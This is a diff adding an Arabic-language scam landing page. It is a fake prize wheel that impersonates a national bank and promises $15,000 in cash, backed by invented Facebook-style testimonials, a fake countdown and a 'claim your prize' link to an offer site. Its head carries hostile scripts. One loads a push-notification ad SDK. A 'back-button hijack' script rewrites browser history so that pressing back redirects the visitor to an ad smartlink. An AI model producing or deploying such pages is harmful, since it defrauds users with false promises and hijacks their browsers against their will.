@@ -1,0 +1,204 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <title>تهانينا</title>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+    
+  <meta name="alert-message" content="نحنآسفون\n\nالرجاء إعادة المحاولة. لديك فرصة واحدة إضافية!">
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="app.css" type="text/css" rel="stylesheet" />
+  
+  
+   <!--Rollerads-->
+<script async data-cfasync="false">
+  (function() {
+      const url = new URL(window.location.href);
+      const clickID = url.searchParams.get("click_id");
+      const sourceID = url.searchParams.get("source_id");
+
+      const s = document.createElement("script");
+      s.dataset.cfasync = "false";
+      s.src = "https://sdk4push.com/f/sdk.js?z=1238026";
+      s.onload = (opts) => {
+          opts.zoneID = 1238026;
+          opts.extClickID = clickID;
+          opts.subID1 = sourceID;
+          opts.actions.onPermissionGranted = () => {};
+          opts.actions.onPermissionDenied = () => {};
+          opts.actions.onAlreadySubscribed = () => {};
+          opts.actions.onError = () => {};
+      };
+      document.head.appendChild(s);
+  })()
+</script>
+
+<!-- bbr popunder -->
+
+
+<script> 
+//BB
+function imiBB() { let url = "https://app.impih.com/?utm_medium=5ae7ba4afe38e1b4a15a26ed73407602b2b5b3e9&utm_campaign=LK_smartlink_20240527&1=main&2=bbr&np=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+  
+  
+  
+</head>
+
+<body >
+  <main id="app" v-cloak>
+    <div class="header">
+      أدر واربح
+      <img class="header__icon" src="img/notification.png" alt="" />
+    </div>
+    <div class="step" v-if="!hasWon">
+      <div class="card">
+        <div class="step__text">
+          <div class='step__date'>
+            {{ DateHelper().getMonthName() }}
+            {{ DateHelper().getDate() }},
+            {{ DateHelper().getYear() }}
+          </div>
+          <h1 class="step__title">
+            تهانينا البنك الوطني المستعمل، لديك (1)  مكافأة معلقة !!
+          </h1>
+          <div class="step__subtitle">
+            كل<span class="strong">{{ DateHelper().getDayName() }}</span> نحدد 10 مستخدم محظوظ لتلقي مكافأة.
+          </div>
+        </div>
+        <div class="step__bar">
+          اطلب مكافأتك<br /><em>↓</em> أدر العجله <em>↓</em>
+        </div>
+        <vue-prize-wheel ref="prizeWheel" class="prize-wheel" static-image="img/prizewheel_static.png" prize-image="img/default@0.5x.png" :start-at="startPrizewheelAt" v-on:lost="retryModalOpen = true" v-on:finish="hasWon = true">
+          <template v-slot:spinner>
+            <img src="img/prizewheel_spinner.jpg" class="prize-wheel__wheel" alt="" />
+            <img src="img/default@0.5x.png" class="prize-wheel__prize" alt="" />
+          </template>
+        </vue-prize-wheel>
+      </div>
+    </div>
+    <div class="step" v-if="hasWon && !isLoaded">
+      <div class="card step__loader">
+        <img src="img/loader.gif" alt="جاري التحميل" />
+      </div>
+    </div>
+    <div class="step step--end" v-if="isLoaded">
+      <div class="card card--centered">
+        <div class="step__title step__title--bold">
+          تهانينا!
+          فقط أكمل هذه الخطوات لتلقي ١٥٬٠٠٠٫٠٠ USD$ نقدًا  الخاص بك!
+        </div>
+      </div>
+      <div class="card">
+        <div>
+          1. Click &#039;اطلب جائزتك&#039; to claim your prize. سيتم تحويلك إلى موقع شريكنا.</div>
+        <div>
+          2. اتبع الخطوات على موقع الشريك
+        </div>
+        <div>
+          <span class="strong">هام</span>
+          قد يصبح المنتج غير متوفر في أي وقت
+        </div>
+        <div>اختر بسرعة</div>
+      </div>
+      <div class="card">
+        العرض سارٍ حتى <span><span v-html="countdownMinutes"></span> دقيقةدقائق و<span v-html="countdownSeconds"></span> ثانيةثوانٍ</span> التالي
+      </div>
+      <div class="card">
+        <div class="step__prize">
+          <div class="step__prize-image">
+            <img src="img/default@0.5x.png" class="step__prize-image-image" alt="١٥٬٠٠٠٫٠٠ USD$ نقدًا" />
+            <div>بقي (2)</div>
+          </div>
+          <div class="step__prize-details">
+            <div class="step__title step__title--bold">١٥٬٠٠٠٫٠٠ USD$ نقدًا</div>
+            <div>السعر العادي: ١٥٬٠٠٠٫٠٠ USD$</div>
+            <div>
+              السعر الخاص بك:
+              <span class="new-prize">٠٫٠٠ USD$</span>
+            </div>
+            <span class="step__button" v-on:click="openOfferUrl">اطلب جائزتك</span>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="comments">
+      <div class="card">
+        <div class="comments__likes">
+          <span class="comments__link">12,068</span> الإعجابات الإجمالي
+        </div>
+        <vue-facebook-comment avatar="img/7@0.25x.png" name="landdy" message="في البداية لم أكن متأكدًا مما إذا كان هذا حقيقي أم لا، لكنني تلقيت ١٥٬٠٠٠٫٠٠ USD$ نقدًا اليوم :D!" like-text="إعجاب" reply-text="رد" since-text="الآن" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/6@0.25x.jpg" name="77891" message="هل ربح أحد شيئا في هذا اليانصيب؟" like-text="إعجاب" reply-text="رد" since-text="9  دقائق" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/8@0.25x.png" name="نجود ابو رحمة" message="كيف يعمل هذا؟ لقد ربحت بطاقة Amazon منذ بضعة أعوام وكل محاولات بعدها كانت فاشلة" like-text="إعجاب" reply-text="رد" since-text="32  دقائق" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/4@0.25x.jpg" name="سرين الروسان" message="هل يمكنك مساعدتي؟ لقد ربحت للتو بطاقة هدايا!! ما الذي عليّ فعله الآن؟" :likes="12" like-text="إعجاب" reply-text="رد" since-text="55  دقائق" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/8@0.25x.jpg" name="Bryanli" message="١٥٬٠٠٠٫٠٠ USD$ نقدًا جاء عبر البريد اليوم! بفضل البنك الوطني !!" :likes="12" image="img/proof.jpg" like-text="إعجاب" reply-text="رد" since-text="1  ساعة" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/5@0.25x.jpg" name="حارثه العدوان" message="شاهدت هذا العرض المتاح لمرة واحدة ونقرت لإغلاقه لأنني ظننت أنه مزيف. رأيت الإعلان مرة أخرى ولأنني كنت أشعر بالملل قررت تجريبه... وحصلت على iPhone X جديد! ماذا!!؟!" like-text="إعجاب" reply-text="رد" since-text="3  ساعات" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/2@0.25x.jpg" name="kenny" message="كيف يعمل هذا؟ لقد ربحت بطاقة Amazon منذ بضعة أعوام وكل محاولات بعدها كانت فاشلة" :likes="21" like-text="إعجاب" reply-text="رد" since-text="3  ساعات" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/42.webp" name="لطف المعشر" message="لم أكن متأكد أن الأمر حقيقي، لكنني تلقيت بطاقة  الخاص بي اليوم!! 😍 رائع 🔥 🔥" :likes="1" like-text="إعجاب" reply-text="رد" since-text="6  ساعات" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <p class="card__paragraph comments__link">
+          انظر 83 من التعليقات الأقدم
+        </p>
+      </div>
+      <div class="card">
+        <div class="comments__form">
+          <label for="reply">أضف ردًا:</label>
+          <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+          <p class="card__paragraph">
+            <button onclick="alert('شكرا لك على تعليقك، سيتم نشره بعد مراجعته.');">
+              خضع
+            </button>
+          </p>
+        </div>
+      </div>
+    </div>
+    <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+      <div class="modal__title" style="">١٥٬٠٠٠٫٠٠ USD$ نقدًا</div>
+      <img class="modal__image" src="img/default@0.5x.png" alt="١٥٬٠٠٠٫٠٠ USD$ نقدًا" />
+      <p>
+        <span class="strong">
+          {{ DateHelper().getMonthName() }}
+          {{ DateHelper().getDate() }},
+          {{ DateHelper().getYear() }}
+        </span>
+        <br />
+        تهانينا يا مستخدم البنك الوطني !
+        <br />
+        مركز المستهلك الوطني ترغب في شكرك على وفائك.
+        <br />
+      </p>
+      <p>
+        أدر الدولاب للحصول على مكافأتك الخاصة 🎁
+        <br>
+        <br>
+        <span class="strong">حظًا سعيدًا!</span>
+      </p>
+      <button class="modal__button" v-on:click="startFirstSpin">حسنًا</button>
+    </vue-modal>
+    <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+      <div class="modal__title" style="">جرب مرة أخرى!</div>
+      <p>
+        *** لقد ربحت دورة إضافية ***
+      </p>
+      <button class="modal__button" v-on:click="startRetrySpin">حسنًا</button>
+    </vue-modal>
+  </main>
+
+
+<script>window.view = window.view || {};view.offerUrl = "https://tkr3.surpriseanddelightgifts.com/cool.php?lp=1";</script>
+
+
+
+
+    
+    
+
+<script type="application/javascript" src="app.js"></script>
+</body>
+</html>
